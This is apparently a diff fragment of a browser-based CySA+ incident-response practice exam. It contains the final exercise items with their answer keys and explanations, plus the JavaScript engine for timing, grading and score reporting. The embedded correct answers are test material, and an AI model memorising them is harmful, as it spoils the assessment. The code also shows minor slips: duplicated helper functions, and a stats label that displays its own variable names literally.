+    'KIOSK-7 \u2014 lobby kiosk with adware, no sensitive data',
+    'SBX-OLD \u2014 retired VM holding an old malware sample inside the sandbox network'
+  ],
+  hints:['Ask two questions: how far does a compromise from this host reach, and is it actively causing harm now?'],
+  explain:'DC-01 first: a domain controller can hand the attacker every identity in the company, and it is actively compromised. PAY-1 second: confirmed webshell on a payment system means live access to regulated data. DEV-3 third \u2014 malware on a non-admin laptop is contained in blast radius; still a host to fix. KIOSK-7 holds adware with no data \u2014 annoying, not urgent. SBX-OLD last: the sample sits inside an isolated sandbox doing its designed job. Ranking is the skill of converting impact and urgency into an order the team can execute.'
+},
+{
+  id:'m27', type:'fill', theme:'Post-Incident & Program', typeLabel:'Fill in the blanks',
+  title:'Breach notification letter',
+  scenario:'Legal has decided notification is required. You draft the facts section that the notification letter will use. The privacy officer reviews every claim, so precision beats drama.',
+  question:'Complete the draft with the correct term for each blank.',
+  ansLabel:'COMPLETE THE BLANKS \u2014 two bank words are decoys',
+  text:'We became aware of the incident on 3 June and will notify the supervisory authority within {{0}} hours as required. The notice lists the {{1}} of personal data involved and the apparent {{2}} of the exposure. Affected customers receive clear {{3}} on steps they can take, and the letter documents the {{4}} we applied to stop further exposure.',
+  bank:['72','categories','root cause','guidance','containment measures','punishment','deadline'],
+  blanks:[{a:'72'},{a:'categories'},{a:'root cause'},{a:'guidance'},{a:'containment measures'}],
+  hints:['One blank is a number from the regulation, two describe facts, one helps the reader, one shows action taken.'],
+  explain:'GDPR gives 72 hours from awareness to notify the authority. The letter must state the categories of data involved \u2014 names, addresses, payment data \u2014 not every individual record at this stage. The apparent root cause explains how it happened as currently understood. Guidance gives customers concrete protective steps, which is the human purpose of the letter. Containment measures show the exposure is being stopped \u2014 regulators ask exactly this. "Punishment" has no place in a factual notice, and "deadline" is the thing the number measures, not the content.'
+},
+{
+  id:'m28', type:'fill', theme:'Containment', typeLabel:'Fill in the blanks',
+  title:'Containment decision log',
+  scenario:'Three hours into the incident you write the decision log entry that the review will audit. The log must show why each containment choice was made, in the standard vocabulary.',
+  question:'Complete the decision log entry.',
+  ansLabel:'COMPLETE THE BLANKS \u2014 one bank word is a decoy',
+  text:'We chose segmentation over full isolation because full isolation of the payment zone carried an unacceptable {{0}} during trading hours. Host APP-4 was moved into the {{1}} VLAN with only logging allowed. We cut the callback path by configuring a DNS {{2}} for the malicious domain. Every action above was recorded with {{3}} from the SIEM\u2019s single clock.',
+  bank:['business impact','quarantine','sinkhole','timestamps','blacklist'],
+  blanks:[{a:'business impact'},{a:'quarantine'},{a:'sinkhole'},{a:'timestamps'}],
+  hints:['The first blank is the trade-off word; the third is the DNS control; the last is the time record.'],
+  explain:'Segmentation was chosen because full isolation during trading would stop payments \u2014 that cost is the business impact, and decision logs must name it. The host was benched in a quarantine VLAN where nothing but log shipping is permitted. A DNS sinkhole answers the malicious domain with a harmless address, killing the callback for every host at once \u2014 cleaner than chasing each client. Timestamps from one clock keep the log legally usable. "Blacklist" is the decoy: blocking one IP at one firewall is a smaller, less general action than the sinkhole the entry describes.'
+},
+{
+  id:'m29', type:'qcm', theme:'Post-Incident & Program', typeLabel:'Multiple choice',
+  title:'Symptom or root cause?',
+  scenario:'The VPN appliance breach report is in draft. The timeline: attackers logged into the unpatched VPN appliance with a stolen contractor account, reached an internal file share, and left. One reviewer wrote as the root cause: "the contractor clicked a phishing email".',
+  question:'Which statement correctly identifies the root cause?',
+  ansLabel:'CHOOSE ONE',
+  options:[
+    {t:'The unpatched VPN appliance; the phishing email is only how the credential was stolen', ok:true},
+    {t:'The contractor clicking the email, exactly the way the first reviewer wrote it up', ok:false},
+    {t:'The attacker group itself, which the report really ought to name as the cause', ok:false},
+    {t:'Nothing at all \u2014 a root cause cannot exist when antivirus raised no alert', ok:false}
+  ],
+  hints:['The root cause is the weakness that let the attacker achieve the goal \u2014 remove it and the incident fails.'],
+  explain:'A root cause is the underlying weakness without which the incident could not succeed. Fix the unpatched VPN appliance (patch, MFA) and the stolen credential alone would have hit a hardened door \u2014 the incident fails. The phishing click is the credential\u2019s origin: real, but upstream context, not the root of this breach path. Naming the attacker describes the actor, not the weakness. Antivirus silence proves nothing about causes \u2014 appliances are not endpoint malware. Reports that stop at the symptom recommend fixes for the wrong layer, and the same breach returns.'
+},
+{
+  id:'m30', type:'match', theme:'Detection & Analysis', typeLabel:'Drag & drop matching',
+  title:'Match the tool to its IR job',
+  scenario:'New SOC onboarding, day three. Before you touch the real consoles, you must be able to say what each tool is for \u2014 the team quiz starts with this matching board.',
+  question:'Drag each tool onto the job it does in incident response.',
+  ansLabel:'DRAG ITEMS TO SLOTS',
+  slots:[
+    {label:'Isolates endpoints and records endpoint activity for response'},
+    {label:'Collects logs from everywhere and correlates them into alerts'},
+    {label:'Detonates suspicious files safely to watch their behaviour'},
+    {label:'Keeps the official incident record, tasks and timeline'},
+    {label:'Images and analyses disks and memory for investigation'},
+    {label:'Executes playbook actions automatically, like enriching and ticketing'}
+  ],
+  items:[
+    {t:'EDR', s:0},
+    {t:'SIEM', s:1},
+    {t:'Sandbox', s:2},
+    {t:'Ticketing system', s:3},
+    {t:'Forensic suite', s:4},
+    {t:'SOAR platform', s:5}
+  ],
+  hints:['Two tools watch, one acts automatically, one detonates, one dissects, one documents.'],
+  explain:'EDR lives on endpoints: it records process, file and network activity and can isolate a host with one click. SIEM is the central log brain: collect, correlate, alert. A sandbox runs suspicious files in a sealed environment and records what they really do \u2014 behaviour beats signatures. The ticketing system holds the official record: decisions, times, tasks \u2014 the thing audits and courts read. A forensic suite images and dissects disks and memory. SOAR automates the playbook glue: enrichment, blocking, ticket updates, so analysts spend time on judgment. Confusing SIEM with SOAR is the classic beginner slip: one watches, the other acts.'
+}
+);
+
+</script>
+<script>
+/* ================= CySA+ 8.2 exam engine (part 1: framework) ================= */
+(function(){
+'use strict';
+var EX = window.EX || [];
+var CFG = window.CFG || {};
+var KW = window.KW || {};
+var META = {};
+try { META = JSON.parse(document.getElementById('cm-exercise-meta').textContent); } catch(e){}
+var N = EX.length;
+var PEREX = CFG.perEx || 180;
+var TOTAL = (window.__CM_TEST_FAST__ ? 0 : 0) || PEREX * N;
+var fastParam = 0;
+try { fastParam = parseInt(new URLSearchParams(location.search).get('fast')||'0',10) || 0; } catch(e){}
+if (fastParam > 0) { TOTAL = fastParam; }
+
+var S = {
+  order: [], cur: -1, view: 'intro', started: false, ended: false,
+  manual: false, checkPause: false, remaining: TOTAL, reported: false,
+  ans: [], username: '', tick: null
+};
+
+/* ---------- helpers ---------- */
+function $(id){ return document.getElementById(id); }
+function el(tag, cls, html){ var e=document.createElement(tag); if(cls) e.className=cls; if(html!==undefined) e.innerHTML=html; return e; }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function shuf(a){ a=a.slice(); for(var i=a.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var t=a[i]; a[i]=a[j]; a[j]=t; } return a; }
+function fmtTime(sec){ sec=Math.max(0,sec); var h=Math.floor(sec/3600), m=Math.floor((sec%3600)/60), s=sec%60; var mm=(m<10&&h>0?'0':'')+m, ss=(s<10?'0':'')+s; return h>0 ? h+':'+mm+':'+ss : mm+':'+ss; }
+function rnd1(x){ return Math.round(x*10)/10; }
+function themeOf(ex){ return ex.theme || 'General'; }
+function scrollMotion(){ try { return window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth'; } catch(e){ return 'auto'; } }
+function isSkippedState(a){ return !!(a.skipped && !a.checked); } /* checked answers keep their score even if Skip was pressed after Check */
+function scrollMotion(){ try { return window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth'; } catch(e){ return 'auto'; } }
+function isSkippedState(a){ return !!(a.skipped && !a.checked); } /* checked answers keep their score even if Skip was pressed after Check */
+
+/* ---------- init answer state ---------- */
+function freshAns(){ return { status:'new', checked:false, skipped:false, earned:0, max:10, hints:0, sum:'', ui:{} }; }
+function resetAll(){
+  S.ended=false; S.started=false; S.manual=false; S.checkPause=false;
+  S.remaining=TOTAL; S.reported=false; S.cur=-1;
+  S.ans = EX.map(function(){ return freshAns(); });
+  S.order = shuf(EX.map(function(_,i){ return i; }));
+}
+
+/* ---------- website handshake ---------- */
+window.addEventListener('message', function (event) {
+  if (!event.data) return;
+  if (event.data.type !== 'CYBERPULSE_INIT' && event.data.type !== 'CYBERMASTERY_INIT') return;
+  try {
+    S.username = event.data.username || '';
+  } catch(e){}
+  paintGreeting();
+});
+function paintGreeting(){
+  if (!S.username) return;
+  ['greetline','greetsub'].forEach(function(id){
+    var g = $(id);
+    if (g) g.textContent = 'Good luck, ' + S.username + '.';
+  });
+}
+
+function reportScore(correct, total){
+  if (S.reported) return;
+  S.reported = true;
+  var percent = Math.round((correct / total) * 100);
+  try {
+    parent.postMessage({
+      type: 'CYBERPULSE_SCORE',
+      topicId: 'cysa-plus',
+      score: correct,
+      total: total,
+      percent: percent,
+      passed: percent >= 70
+    }, location.origin);
+  } catch (e) { /* opened directly, nothing to report to */ }
+}
+
+/* ---------- timer ---------- */
+function anyPause(){ return S.manual || S.checkPause; }
+function startTimer(){
+  if (S.tick) clearInterval(S.tick);
+  S.tick = setInterval(function(){
+    if (!S.started || S.ended || anyPause()) return;
+    S.remaining--;
+    if (S.remaining <= 0) { S.remaining = 0; paintTimer(); endExam('time'); return; }
+    paintTimer();
+  }, 1000);
+  paintTimer();
+}
+function paintTimer(){
+  var t = $('timerbox'); if (!t) return;
+  t.textContent = fmtTime(S.remaining);
+  t.classList.toggle('low', S.remaining <= 300);
+}
+function paintPauseChips(){
+  var m = $('pausechipManual'), c = $('pausechipCheck');
+  if (m) m.classList.toggle('on', S.manual);
+  if (c) c.classList.toggle('on', S.checkPause);
+  document.body.classList.toggle('manual', S.manual && S.view === 'exam');
+  var veil = $('pauseveil');
+  if (veil) veil.classList.toggle('on', S.manual && S.view === 'exam');
+}
+function setManual(v){ S.manual = v; paintPauseChips(); var b=$('pausebtn'); if(b){ b.textContent = S.manual ? 'Resume' : 'Pause'; b.setAttribute('aria-pressed', S.manual?'true':'false'); } }
+
+/* ---------- live score ---------- */
+function liveScore(){
+  var e=0, a=0;
+  S.ans.forEach(function(x,i){ if(x.checked){ e+=x.earned; a++; } });
+  return {e:rnd1(e), a:a};
+}
+function paintScore(){
+  var ls = liveScore();
+  var sc=$('scorebox'), an=$('ansbox');
+  if (sc) sc.innerHTML = 'Score: <b>'+ls.e+'</b> pts';
+  if (an) an.textContent = 'Answered: '+ls.a+'/'+N;
+  var pb = $('pbarfill');
+  if (pb) pb.style.width = Math.round(100*(ls.a/N))+'%';
+  paintThemeStrip();
+}
+function paintThemeStrip(){
+  var strip = $('themestrip'); if(!strip) return;
+  var acc = {};
+  EX.forEach(function(ex,i){ var t=themeOf(ex); acc[t]=acc[t]||{c:0,d:0}; acc[t].d++; if(S.ans[i]&&S.ans[i].checked){ acc[t].c++; acc[t].e=(acc[t].e||0)+S.ans[i].earned; } });
+  strip.innerHTML = '';
+  Object.keys(acc).forEach(function(t){
+    var o=acc[t];
+    var b=el('div','tbar'); b.title=t;
+    b.innerHTML = esc(t)+' ('+o.c+'/'+o.d+')<i><u style="width:'+Math.round(100*o.c/o.d)+'%"></u></i>';
+    strip.appendChild(b);
+  });
+}
+function paintNav(){
+  var g = $('navgrid'); if(!g) return;
+  g.innerHTML='';
+  S.order.forEach(function(ei,pos){
+    var a=S.ans[ei];
+    var st = a.checked ? 'answered' : (isSkippedState(a) ? 'skipped' : 'not answered yet');
+    var mark = a.checked ? '<span class="navstate" aria-hidden="true">\u2713</span>' : (isSkippedState(a) ? '<span class="navstate" aria-hidden="true">\u2026</span>' : '');
+    var b=el('button',null, String(pos+1)+mark);
+    b.type='button';
+    b.title = 'Exercise '+(pos+1)+' — ' + EX[ei].title + ' (' + st + ')';
+    b.setAttribute('aria-label','Go to exercise '+(pos+1)+', '+st);
+    if (pos===S.cur && S.view==='exam') b.classList.add('cur');
+    if (a.checked) b.classList.add('checked');
+    if (isSkippedState(a)) b.classList.add('skipped');
+    if (pos===S.cur && S.view==='review') b.classList.add('cur');
+    b.disabled = S.ended;
+    b.addEventListener('click', function(){ if(!S.ended){ gotoQ(pos); } });
+    g.appendChild(b);
+  });
+}
+
+/* ---------- navigation ---------- */
+function gotoQ(pos){
+  if (pos < 0 || pos >= N) return;
+  S.cur = pos; S.view='exam';
+  renderExam();
+}
+function nextQ(){
+  S.checkPause = false; paintPauseChips();
+  if (S.cur < N-1) { gotoQ(S.cur+1); }
+  else { renderReview(); }
+}
+function prevQ(){ if (S.cur > 0) gotoQ(S.cur-1); }
+
+/* ---------- check / revise / skip / hint ---------- */
+function curEx(){ return EX[S.order[S.cur]]; }
+function curAns(){ return S.ans[S.order[S.cur]]; }
+
+function doCheck(){
+  var ex = curEx(), a = curAns();
+  var box = $('answerbox'); if(!box) return;
+  var res = grade(ex, a); /* {earned, elements:[{label,state}], complete} */
+  var factor = Math.max(0, 1 - 0.10 * a.hints);
+  a.earned = Math.round(res.earned * factor * 10) / 10;
+  a.status = 'checked'; a.checked = true; a.skipped = false;
+  a.sum = summarize(ex, a);
+  S.checkPause = true;
+  paintPauseChips();
+  markAnswers(ex, a, res, box);
+  paintFeedback(res, a);
+  showExpl();
+  paintScore(); paintNav();
+  var rb = $('revisebtn'); if (rb) rb.disabled = false;
+  var fb = $('feedback'); if (fb) fb.scrollIntoView({block:'nearest',behavior:'smooth'});
+}
+function doRevise(){
+  var a = curAns();
+  a.checked = false; a.status = 'new'; a.earned = 0;
+  reviseUI(curEx(), a);
+  var fb=$('feedback'); if(fb) fb.innerHTML='';
+  var ex_=$('explbox'); if(ex_) ex_.style.display='none';
+  paintScore(); paintNav();
+}
+function doSkip(){
+  var a = curAns();
+  if (!a.checked) a.skipped = true; /* a checked answer keeps its score; Skip then only moves on */
+  nextQ();
+}
+function doHint(){
+  var ex = curEx(), a = curAns();
+  var hints = ex.hints || [];
+  if (a.hints >= hints.length) return;
+  var h = hints[a.hints]; a.hints++;
+  var bar = $('hintbar');
+  if (bar) {
+    var item = el('div','hintitem','<b>Hint '+(a.hints)+' (cost: \u221210% of this exercise):</b> '+h);
+    bar.appendChild(item);
+  }
+  var hb = $('hintbtn');
+  if (hb && a.hints >= hints.length) hb.disabled = true;
+}
+
+/* ---------- explanation / feedback paint ---------- */
+function paintFeedback(res, a){
+  var fb = $('feedback'); if(!fb) return;
+  fb.innerHTML = '';
+  var factor = Math.max(0, 1 - 0.10 * a.hints);
+  (res.elements||[]).forEach(function(e2){
+    var word = e2.state==='ok' ? '\u2713 Correct' : (e2.state==='bad' ? '\u2715 Wrong' : (e2.state==='miss' ? '\u26a0 Missed' : ''));
+    if (!word) return;
+    fb.appendChild(el('div','frow '+e2.state, '<span class="ic">'+word+'</span><span>'+e2.label+'</span>'));
+  });
+  var max = a.max;
+  var shown = Math.round(res.earned * factor * 10)/10;
+  fb.appendChild(el('div','fscore','You earned '+shown+' / '+max+' points on this exercise.'));
+}
+function showExpl(){
+  var ex = curEx(), a = curAns();
+  var b = $('explbox'); if(!b) return;
+  b.style.display='block';
+  b.innerHTML = '<h4>WHY \u2014 EXPLANATION</h4><div>'+ex.explain+'</div>';
+}
+
+/* ---------- views ---------- */
+function renderApp(){
+  var app = $('app');
+  app.innerHTML = '';
+  app.appendChild(buildHeader());
+  var stage = el('div'); stage.id='stage'; app.appendChild(stage);
+  var veil = el('div','pauseveil','<h2>Paused (manual)</h2><p>Exercise content is hidden while the timer is paused this way.</p><button class="btn primary" id="resumebtn" type="button">Resume</button>');
+  veil.id='pauseveil';
+  app.appendChild(veil);
+  veil.querySelector('#resumebtn').addEventListener('click', function(){ setManual(false); });
+}
+function buildHeader(){
+  var h = el('div','hdr');
+  h.innerHTML =
+    '<div class="hdr-row">'+
+      '<div><div class="hdr-title">'+esc(CFG.examTitle)+'</div>'+
+      '<div class="hdr-sub">'+esc(CFG.sev)+' severity \u00b7 pass mark 70% \u00b7 <span id="greetline"></span></div></div>'+
+      '<div class="hdr-right">'+
+        '<span class="pausechip manual" id="pausechipManual">\u23f8 Paused (manual)</span>'+
+        '<span class="pausechip checkp" id="pausechipCheck">\u23f1 Timer paused \u2014 review mode</span>'+
+        '<span class="timer" id="timerbox" aria-label="Time remaining">'+fmtTime(TOTAL)+'</span>'+
+        '<button class="btn" id="pausebtn" type="button" aria-pressed="false">Pause</button>'+
+        '<span class="chipstat" id="scorebox">Score: <b>0</b> pts</span>'+
+        '<span class="chipstat" id="ansbox">Answered: 0/'+N+'</span>'+
+        '<button class="btn ghost" id="reviewbtn" type="button">Review &amp; submit</button>'+
+      '</div>'+
+    '</div>'+
+    '<div class="pbar" aria-hidden="true"><div id="pbarfill"></div></div>'+
+    '<div class="navgrid" id="navgrid" role="navigation" aria-label="Exercise navigator"></div>'+
+    '<div class="themestrip" id="themestrip"></div>';
+  h.querySelector('#pausebtn').addEventListener('click', function(){ setManual(!S.manual); });
+  h.querySelector('#reviewbtn').addEventListener('click', function(){ if(!S.ended){ renderReview(); } });
+  return h;
+}
+
+function showIntro(){
+  S.view='intro';
+  var st=$('stage');
+  st.innerHTML='';
+  var hero = el('div','hero');
+  var kwHtml = '';
+  Object.keys(KW).forEach(function(t){
+    kwHtml += '<details><summary>'+esc(t)+'</summary><div class="kws">';
+    KW[t].forEach(function(k){ kwHtml += '<span>'+esc(k)+'</span>'; });
+    kwHtml += '</div></details>';
+  });
+  hero.innerHTML =
+    '<h1>8.2 - Performing Incident Response Activities</h1>'+
+    '<div class="sub" id="greetsub"></div>'+
+    '<p>'+CFG.blurb+'</p>'+
+    '<div class="metagrid">'+
+      '<div class="m"><b>'+N+'</b><span>exercises</span></div>'+
+      '<div class="m"><b>'+Math.round(TOTAL/60)+'</b><span>minutes (timer)</span></div>'+
+      '<div class="m"><b>70%</b><span>pass mark</span></div>'+
+      '<div class="m"><b>'+CFG.sev+'</b><span>severity</span></div>'+
+      '<div class="m"><b>10</b><span>points each</span></div>'+
+    '</div>'+
+    '<div class="rules">'+
+      '<div class="r"><b>Check</b><p>Press <b>Check</b> to grade an exercise. Correct parts turn green, wrong parts red, missed parts amber. Checking automatically pauses the timer in <b>review mode</b>: content stays visible, and the timer resumes only when you press <b>Next</b>.</p></div>'+
+      '<div class="r"><b>Two kinds of pause</b><p><b>Manual Pause</b> hides the exercise while paused. <b>Check-pause</b> keeps everything visible so you can study the feedback. Both can stack; the clock only runs when neither is active.</p></div>'+
+      '<div class="r"><b>Skip &amp; come back</b><p><b>Skip</b> jumps to the next exercise and marks it amber in the navigator. You can return to any skipped exercise while time remains. Skipped exercises are <b>excluded from scoring</b> entirely.</p></div>'+
+      '<div class="r"><b>Partial credit</b><p>Multi-answer exercises are scored <b>per correct element</b>. Getting 3 of 4 slots right earns 3/4 of the points. Wrong picks earn nothing extra but do not subtract.</p></div>'+
+      '<div class="r"><b>Hints</b><p>Each hint reveals a nudge and costs <b>\u221210%</b> of that exercise\u2019s points. Hints never pause the timer.</p></div>'+
+      '<div class="r"><b>'+esc(CFG.termLabel)+'</b><p>'+CFG.termHelp+'</p></div>'+
+      '<div class="r"><b>Exercise types</b><p>Alert-triage tables, log analysis with a live filter box, drag-and-drop matching, multi-select, single-choice questions, timeline ordering and priority ranking, fill-in-the-blank reports, spot-the-mistake configs, branching decisions, and the simulated terminal described above.</p></div>'+
+    '</div>'+
+    '<div class="kwpanel"><h3 style="margin:4px 0 2px">Keywords covered</h3><p style="color:var(--dim);font-size:13px;margin:2px 0 8px">Every keyword below is exercised at least once in this exam.</p>'+kwHtml+'</div>'+
+    '<button class="btn primary bigstart" id="startbtn" type="button">Start the '+esc(CFG.sev)+' exam</button>';
+  st.appendChild(hero);
+  paintGreeting();
+  $('startbtn').addEventListener('click', function(){
+    resetAll(); S.started=true; startTimer(); S.view='exam'; S.cur=0;
+    renderExam();
+  });
+  paintNav(); paintScore(); paintTimer(); paintPauseChips();
+  var pb=$('pausebtn'), rb=$('reviewbtn'); /* re-enable header controls after a Retake (endExam disables them) */
+  if (pb) pb.disabled = false;
+  if (rb) rb.disabled = false;
+}
+
+function renderExam(){
+  S.view='exam';
+  paintPauseChips();
+  var st=$('stage'); st.innerHTML='';
+  var ei=S.order[S.cur], ex=EX[ei], a=S.ans[ei];
+  var card = el('section','card');
+  var head = el('div','exhead');
+  head.innerHTML = '<span class="tag">'+esc(ex.typeLabel)+'</span><span class="tag theme">'+esc(ex.theme)+'</span><span class="exnum">Exercise '+(S.cur+1)+' of '+N+' \u00b7 10 pts</span>';
+  card.appendChild(head);
+  var sc = el('div','blk scenario','<span class="lbl">SCENARIO</span><div>'+ex.scenario+'</div>');
+  card.appendChild(sc);
+  var q = el('div','blk question','<span class="lbl">QUESTION</span><div>'+ex.question+'</div>');
+  card.appendChild(q);
+  var ab = el('div','blk answers');
+  ab.id='answerbox';
+  ab.innerHTML = '<span class="lbl">ANSWERS</span><div class="anslabel">'+esc(ex.ansLabel)+'</div>';
+  card.appendChild(ab);
+  var hb = el('div','hintbar'); hb.id='hintbar'; card.appendChild(hb);
+  var fb = el('div','feedback'); fb.id='feedback'; card.appendChild(fb);
+  var eb = el('div','expl'); eb.id='explbox'; eb.style.display='none'; card.appendChild(eb);
+  var br = el('div','btnrow');
+  function mkbtn(id,txt,cls,fn,dis){ var b=el('button','btn '+(cls||''),txt); b.type='button'; b.id=id; if(dis)b.disabled=true; b.addEventListener('click',fn); return b; }
+  br.appendChild(mkbtn('checkbtn','Check','good',doCheck));
+  br.appendChild(mkbtn('revisebtn','Revise','',doRevise,'true'));
+  br.appendChild(mkbtn('hintbtn','Hint (\u221210%)','warn',doHint, !(ex.hints&&ex.hints.length) || a.hints >= (ex.hints||[]).length));
+  br.appendChild(mkbtn('skipbtn','Skip','',doSkip));
+  br.appendChild(el('span','spacer'));
+  br.appendChild(mkbtn('prevbtn','\u2190 Prev','',prevQ, S.cur===0));
+  br.appendChild(mkbtn('nextbtn', S.cur===N-1 ? 'Next \u2192 Review' : 'Next \u2192','primary',nextQ));
+  card.appendChild(br);
+  st.appendChild(card);
+  renderType(ex, a, ab);
+  $('revisebtn').disabled = !a.checked;
+  if (a.checked) { reMark(ex, a, ab); var res=grade(ex,a); paintFeedback(res,a); showExpl(); }
+  try { st.querySelector('.blk.question').setAttribute('tabindex','-1'); } catch(e){}
+  paintNav(); paintScore();
+  window.scrollTo({top:0,behavior:scrollMotion()});
+}
+
+function renderReview(){
+  S.view='review';
+  /* NOTE: an active Check-pause is intentionally NOT cleared here — only "Next" may resume it */
+  paintPauseChips();
+  var st=$('stage'); st.innerHTML='';
+  var card = el('section','card');
+  var skipped=[], unanswered=[];
+  S.order.forEach(function(ei,pos){
+    var a=S.ans[ei];
+    if (isSkippedState(a)) skipped.push(pos);
+    else if (!a.checked) unanswered.push(pos);
+  });
+  var html = '<h2 style="margin-top:0">Review &amp; submit</h2>';
+  html += '<p style="color:var(--dim)">Answered exercises are locked with their checked score until you press <b>Revise</b> on them. You can jump back to any exercise while time remains.</p>';
+  if (skipped.length) html += '<div class="warnbox"><b>'+skipped.length+' skipped exercise(s):</b> '+skipped.map(function(p){return '#'+(p+1);}).join(', ')+'. Skipped exercises are excluded from scoring entirely \u2014 neither their points earned nor their possible points count. You can still open them below and finish them before submitting.</div>';
+  if (unanswered.length) html += '<div class="warnbox"><b>'+unanswered.length+' unchecked exercise(s):</b> '+unanswered.map(function(p){return '#'+(p+1);}).join(', ')+'. They count as zero points unless you go back and answer them.</div>';
+  card.innerHTML = html;
+  var grid = el('div','reviewgrid');
+  S.order.forEach(function(ei,pos){
+    var a=S.ans[ei];
+    var mark = a.checked ? '<span class="navstate" aria-hidden="true">\u2713</span>' : (isSkippedState(a) ? '<span class="navstate" aria-hidden="true">\u2026</span>' : '');
+    var st = a.checked ? 'answered' : (isSkippedState(a) ? 'skipped' : 'not answered yet');
+    var b=el('button',null,(pos+1)+mark);
+    b.type='button';
+    b.title=EX[ei].title+' ('+st+')';
+    b.setAttribute('aria-label','Go to exercise '+(pos+1)+', '+st);
+    if(a.checked) b.classList.add('checked');
+    if(isSkippedState(a)) b.classList.add('skipped');
+    b.addEventListener('click',function(){ gotoQ(pos); });
+    grid.appendChild(b);
+  });
+  card.appendChild(grid);
+  var br = el('div','btnrow');
+  var back = el('button','btn','\u2190 Back to exercise');
+  back.type='button'; back.addEventListener('click', function(){ gotoQ(Math.max(0,S.cur)); });
+  var sp=el('span','spacer');
+  var sub = el('button','btn good','Submit exam');
+  sub.type='button'; sub.id='submitbtn'; sub.setAttribute('aria-label','Submit the exam for scoring');
+  sub.addEventListener('click', submitClicked);
+  br.appendChild(back); br.appendChild(sp); br.appendChild(sub);
+  card.appendChild(br);
+  st.appendChild(card);
+  paintNav();
+  window.scrollTo({top:0,behavior:scrollMotion()});
+}
+function submitClicked(){
+  var anyAnswered = S.ans.some(function(x){ return x.checked; });
+  if (!anyAnswered) {
+    var st=$('stage');
+    var w = el('div','warnbox','<b>Cannot submit:</b> every exercise is skipped or unanswered. Please answer at least one exercise before submitting. No score was reported.');
+    st.insertBefore(w, st.firstChild);
+    return;
+  }
+  var skippedCount = S.ans.filter(function(x){ return x.skipped; }).length;
+  if (skippedCount > 0) {
+    var ok = window.confirm(skippedCount+' exercise(s) are still skipped and will be excluded from scoring. Submit anyway?');
+    if (!ok) return;
+  }
+  endExam('submit');
+}
+
+/* ================= engine part 2: results + exercise types ================= */
+
+/* ---------- end of exam & results ---------- */
+function endExam(reason){
+  if (S.ended) return;
+  S.ended = true;
+  setManual(false); S.checkPause = false;
+  if (S.tick) { clearInterval(S.tick); S.tick = null; }
+  var pb=$('pausebtn'), rb=$('reviewbtn');
+  if (pb) { pb.disabled = true; }
+  if (rb) { rb.disabled = true; }
+  renderResults(reason);
+}
+function computeResults(){
+  var possible = 0, earned = 0, full=0, partial=0, zero=0, skipped=0;
+  var rows = [];
+  S.order.forEach(function(ei,pos){
+    var ex=EX[ei], a=S.ans[ei];
+    if (a.skipped && !a.checked) { skipped++; rows.push({pos:pos,ex:ex,a:a,label:'skipped'}); return; }
+    possible += 10;
+    var e = a.checked ? a.earned : 0;
+    earned += e;
+    var label = e>=9.95 ? 'full' : (e>0.05 ? 'partial' : 'zero');
+    if (label==='full') full++; else if (label==='partial') partial++; else zero++;
+    rows.push({pos:pos,ex:ex,a:a,label:label});
+  });
+  earned = Math.round(earned);
+  var percent = possible>0 ? Math.round(earned/possible*100) : 0;
+  return {possible:possible, earned:earned, percent:percent, full:full, partial:partial, zero:zero, skipped:skipped, rows:rows};
+}
+function correctSummary(ex){
+  try {
+    if (ex.type==='qcm' || ex.type==='logview') {
+      for (var i=0;i<ex.options.length;i++) if (ex.options[i].ok) return ex.options[i].t;
+    }
+    if (ex.type==='multi') return ex.options.filter(function(o){return o.ok;}).map(function(o){return o.t;}).join(' \u00b7 ');
+    if (ex.type==='match') return ex.slots.map(function(s,i){ var it=ex.items.filter(function(x){return x.s===i;})[0]; return s.label+': '+(it?it.t:''); }).join(' \u00b7 ');
+    if (ex.type==='order') return ex.ordered.join(' \u2192 ');
+    if (ex.type==='fill') return ex.blanks.map(function(b){return b.a;}).join(' \u00b7 ');
+    if (ex.type==='terminal') return ex.canon;
+    if (ex.type==='spot') return ex.lines.map(function(l,i){return l.bad?('line '+(i+1)+': '+l.t):null;}).filter(Boolean).join(' \u00b7 ');
+    if (ex.type==='triage') return ex.rows.map(function(r,i){return (i+1)+': '+ex.opts[r.a];}).join(' \u00b7 ');
+    if (ex.type==='branch') return ex.steps.map(function(s,i){ var c=s.choices.filter(function(x){return x.ok;})[0]; return 'step '+(i+1)+': '+(c?c.t:''); }).join(' \u00b7 ');
+  } catch(e){}
+  return '(see explanation)';
+}
+function renderResults(reason){
+  var st=$('stage'); st.innerHTML='';
+  var R = computeResults();
+  var card = el('section','card');
+  var pass = R.possible>0 && R.percent>=70;
+  var banner = el('div','banner '+(pass?'pass':'fail'));
+  var who = S.username ? ' \u2014 '+esc(S.username) : '';
+  if (R.possible===0) {
+    banner.innerHTML = '<h2>No scoreable answers</h2><p>Every exercise was skipped, so no score can be computed and nothing was reported to the site.</p>';
+  } else if (pass) {
+    banner.innerHTML = '<h2>\u2713 PASSED'+who+'</h2><p>You reached the 70% pass mark for this '+esc(CFG.sev)+' exam. Certificate panel: <b>'+esc(CFG.examTitle)+'</b> \u2014 8.2 mastered at '+esc(CFG.sev)+' level.</p>';
+  } else {
+    banner.innerHTML = '<h2>\u2715 FAILED'+who+'</h2><p>You scored below the 70% pass mark. Study the report below, focus on the amber and red topics, then retake the exam.</p>';
+  }
+  card.appendChild(banner);
+  if (R.possible>0) {
+    var ringWrap = el('div','scorering');
+    var C = 2*Math.PI*52;
+    var col = pass ? '#34d399' : '#f87171';
+    ringWrap.innerHTML =
+      '<svg class="ring" viewBox="0 0 120 120" role="img" aria-label="Final score '+R.percent+' percent">'+
+      '<circle cx="60" cy="60" r="52" fill="none" stroke="#1b2540" stroke-width="12"/>'+
+      '<circle cx="60" cy="60" r="52" fill="none" stroke="'+col+'" stroke-width="12" stroke-linecap="round" stroke-dasharray="'+C+'" stroke-dashoffset="'+(C*(1-R.percent/100))+'" transform="rotate(-90 60 60)"/>'+
+      '<text class="num" x="60" y="58" text-anchor="middle">'+R.percent+'%</text>'+
+      '<text class="cap" x="60" y="76" text-anchor="middle">PASS MARK 70%</text></svg>';
+    var stats = el('div','stats');
+    [['+R.earned+ / '+R.possible,'points (skipped excluded)'],[R.full,'fully correct'],[R.partial,'partially correct'],[R.zero,'zero points'],[R.skipped,'skipped (not counted)']].forEach(function(p){
